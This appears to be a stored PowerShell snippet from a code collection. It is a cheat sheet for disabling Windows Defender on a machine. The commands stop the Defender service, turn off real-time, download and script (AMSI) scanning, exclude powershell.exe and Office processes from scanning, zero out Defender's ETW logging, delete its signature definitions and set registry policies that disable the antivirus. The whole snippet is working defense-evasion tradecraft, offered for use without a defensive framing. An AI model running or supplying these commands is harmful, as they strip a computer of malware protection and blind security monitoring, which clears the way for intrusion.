---
id: 74bff4b6-6f07-4ccf-b4a2-7f76644d0b5f
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.684583+00:00'
updated_at: '2023-04-10T20:37:26.823164+00:00'
---

# Code Snippet 74bff4b6

**Language**: Powershell

```powershell
# Disable Defender
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

## Exclude a process / location
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
Add-MpPreference -ExclusionPath C:\Video, C:\install

# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true
# Disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f

# Wipe currently stored definitions
# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
MpCmdRun.exe -RemoveDefinitions -All

# Remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# Disable Windows Defender Security Center
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f

# Disable Real Time Protection
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
```


